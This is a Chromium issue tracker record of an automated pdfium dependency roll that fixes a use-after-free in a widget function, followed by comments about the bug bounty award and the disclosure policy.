Date: Tue Jul 24 22:01:31 2018

Roll src/third_party/pdfium 315f94a09617..36b2059cae7f (1 commits)

https://pdfium.googlesource.com/pdfium.git/+log/315f94a09617..36b2059cae7f


git log 315f94a09617..36b2059cae7f --date=short --no-merges --format='%ad %ae %s'
2018-07-24 hnakashima@chromium.org Fix UAF in CPDFSDK_Widget::GetMixXFAWidget().


Created with:
  gclient setdep -r src/third_party/pdfium@36b2059cae7f

The AutoRoll server is located here: https://pdfium-roll.skia.org

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

If the roll is causing failures, please contact the current sheriff, who should
be CC'd on the roll, and stop the roller if necessary.



BUG=chromium:860697
TBR=dsinclair@chromium.org

Change-Id: I226f5ba0eb56c7773a902ea3c44f30dbe867bf52
Reviewed-on: https://chromium-review.googlesource.com/1148608
Reviewed-by: pdfium-chromium-autoroll <pdfium-chromium-autoroll@skia-buildbots.google.com.iam.gserviceaccount.com>
Commit-Queue: pdfium-chromium-autoroll <pdfium-chromium-autoroll@skia-buildbots.google.com.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#577701}
[modify] https://crrev.com/1f534eaf590df1753be8112ddd1366bcf4e57803/DEPS


### sh...@chromium.org (2018-07-25)

[Empty comment from Monorail migration]

### mb...@chromium.org (2018-07-27)

[Empty comment from Monorail migration]

### hu...@gmail.com (2018-08-22)

Hi guys, 

I just wonder this report is elegant for your bug bounty program? 

### hn...@chromium.org (2018-08-22)

[Empty comment from Monorail migration]

### aw...@google.com (2018-08-22)

Yep, we'll look at it in an upcoming panel.

### aw...@chromium.org (2018-08-27)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@chromium.org (2018-08-27)

Nice one! The VRP panel decided to award $3,000 for this report - many thanks!

### aw...@chromium.org (2018-09-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-31)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2018-10-31)

This issue was migrated from crbug.com/chromium/860697?no_tracker_redirect=1

[Monorail blocking: crbug.com/chromium/62400]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091856)*
